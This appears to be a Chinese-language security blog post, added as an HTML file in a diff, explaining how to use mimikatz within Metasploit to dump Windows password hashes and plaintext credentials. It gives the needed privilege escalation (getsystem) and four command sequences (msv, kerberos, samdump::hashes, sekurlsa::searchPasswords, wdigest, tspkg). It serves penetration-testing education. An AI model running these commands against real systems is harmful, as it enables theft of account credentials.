@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>使用mimikatz获取windows密码 | 凉生丶因源的blog</title>
+<meta name="description" content="">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="shortcut icon" href="http://liangsheng8708.github.io/favicon.ico?v=1686227407809">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://unpkg.com/papercss@1.6.1/dist/paper.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="http://liangsheng8708.github.io/styles/main.css">
+
+
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+  </head>
+  <body>
+  
+    <nav class="navbar border fixed split-nav">
+  <div class="nav-brand">
+    <h3><a href="http://liangsheng8708.github.io">凉生丶因源的blog</a></h3>
+  </div>
+  <div class="collapsible">
+    <input id="collapsible1" type="checkbox" name="collapsible1">
+    <button>
+      <label for="collapsible1">
+        <div class="bar1"></div>
+        <div class="bar2"></div>
+        <div class="bar3"></div>
+      </label>
+    </button>
+    <div class="collapsible-body">
+      <ul class="inline">
+        
+          <li>
+            
+              <a href="/" class="menu">
+                首页
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/archives" class="menu">
+                归档
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/tags" class="menu">
+                标签
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/post/about" class="menu">
+                关于
+              </a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div id="top" class="row site">
+      <div class="sm-12 md-8 col">
+        <div class="paper">
+          <article class="article">
+            <h1>使用mimikatz获取windows密码</h1>
+            <p class="article-meta">
+              2022-10-13
+              
+                <a href="http://liangsheng8708.github.io/wangan/" class="badge warning">
+                  网安
+                </a>
+              
+            </p>
+            
+            <div class="post-content" v-pre>
+              <h2>工具简介</h2>
+<p><strong>Mimikatz</strong>是法国人<strong>benjamin</strong>开发的一款功能强大的轻量级调试工具，本意是用来个人测试，但由于其功能强大，能够直接读取WindowsXP-2012等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具。</p>
+<h2>常用命令</h2>
+<pre>
+kerberos：kerberos相关的模块<br>
+livessp：尝试检索livessp凭据<br>
+mimikatz_command：运行一个定制的命令<br>
+msv：msv凭证相关的模块，列出目标主机的用户密码哈希<br>
+ssp：ssp凭证相关的模块<br>
+tspkg：tspkg凭证相关的模块<br>
+wdigest：wdigest凭证相关的模块
+</pre>
+<pre>
+<strong>注：</strong><br>
+使用 mimikatz 模块需要System权限，所以我们在使用该模块之前需要将当前MSF中的shell提升为system。<br>
+提到system有两个方法，一是当前的权限是administrator用户，二是利用其它手段先提权到administrator用户。然后administrator用户可以直接getsystem到system权限。
+</pre>
+<h2>使用教程</h2><br>
+加载mimikatz模块<br>
+<pre>
+load mimikatz
+</pre>
+<!-- ![](http://liangsheng8708.github.io/post-images/1665671919129.png) -->
+<img src="http://www.muliang.top/post-images/1665671919129.png"><br>
+<br>
+<strong>第一种方法：</strong><br>
+获取登录密码的hash值<br>
+<pre>
+msv
+</pre>
+<!-- ![](http://liangsheng8708.github.io/post-images/1665673231188.png) -->
+<img src="http://www.muliang.top/post-images/1665673231188.png"><br>
+上面已经是得到hash值了. 下面算明文密码.<br>
+获取明文密码
+<pre>
+kerberos
+</pre>
+look...拿到登录的明文密码了.<br>
+<p><strong>第二种方法：</strong><br><br>
+使用另一种方式获取哈希值<br></p>
+<pre>
+mimikatz_command -f samdump::hashes
+</pre>
+<!-- ![](http://liangsheng8708.github.io/post-images/1665672054493.png) -->
+<p><img src="http://www.muliang.top/post-images/1665672054493.png"><br><br>
+根据上面的方式获取明文密码</p>
+<pre>
+mimikatz_command -f sekurlsa::searchPasswords
+</pre>
+<!-- ![](http://liangsheng8708.github.io/post-images/1665672077026.png) -->
+<p><img src="http://www.muliang.top/post-images/1665672077026.png"><br><br>
+<strong>第三种方法：</strong><br><br>
+使用Wdigest命令<br><br>
+这个命令呢, 没有上面的复杂,加载模块后直接调用这个wdigest.<br></p>
+<pre>
+wdigest
+</pre>
+<!-- ![](http://liangsheng8708.github.io/post-images/1665672246965.png) -->
+<p><img src="http://www.muliang.top/post-images/1665672246965.png"><br><br>
+第四种方法：<br>
+使用tspkg命令</p>
+<pre>
+tspkg
+</pre>
+<!-- ![](http://liangsheng8708.github.io/post-images/1665672274762.png) -->
+<p><img src="http://www.muliang.top/post-images/1665672274762.png"><br></p>
+ <pre>
+<strong>总结</strong><br>
+一、<br>
+load mimikatz #加载mimikatz<br>
+msv #获取hash值<br>
+kerberos #获取明文<br>
+二、<br>
+load mimikatz #加载mimikatz<br>
+mimikatz_command -f samdump::hashes<br>
+mimikatz_command -f sekurlsa::searchPasswords<br>
+三、<br>
+load mimikatz #加载mimikatz<br>
+wdigest #获取系统账户信息<br>
+四、<br>
+load mimikatz #加载mimikatz<br>
+tspkg #获取系统账户信息<br>
+</pre>
+            </div>
+          </article>
+        </div>
+        <div class="paper" data-aos="fade-in">
+          
+            <div class="next-post">
+              <div class="next">
+                下一篇
+              </div>
+              <a href="http://liangsheng8708.github.io/CVE-2007-2447/">
+                <h3 class="post-title">
+                  CVE-2007-2447渗透教程
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+        
+      </div>
+
+      <div class="sm-12 md-4 col sidebar">
+  <div class="paper info-container">
+    <img src="http://liangsheng8708.github.io/images/avatar.png?v=1686227407809" class="no-responsive avatar">
+    <div class="text-muted"></div>
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      最新文章
+    </div>
+    <div class="row">
+      <ul>
+        
+          
+            <li>
+              <a href="http://liangsheng8708.github.io/-yvpxAk1O/">使用docker快速部署一个 IPsec VPN 服务器原创</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="http://liangsheng8708.github.io/zipweijiami/">zip伪加密</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="http://liangsheng8708.github.io/mimikatz/">使用mimikatz获取windows密码</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="http://liangsheng8708.github.io/CVE-2007-2447/">CVE-2007-2447渗透教程</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="http://liangsheng8708.github.io/CVE-2011-2523/">CVE-2011-2523渗透教程</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="http://liangsheng8708.github.io/hydra/">hydra的使用教程</a>
+            </li>
+          
+        
+      </ul>
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      标签列表
+    </div>
+    <div class="row">
+      
+        <a href="http://liangsheng8708.github.io/wangan/" class="badge ">
+          网安
+        </a>
+      
+    </div>
+  </div>
+  <div class="paper">
+    Powered by <a href="https://github.com/liangsheng8708" target="_blank">凉生丶因源</a><br /><a href="//beian.miit.gov.cn/" target="_blank">闽ICP备2022016489号-1</a> | <a class="rss" href="http://liangsheng8708.github.io/atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+
+
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+</script>
+
+
+
+
+  </body>
+</html>
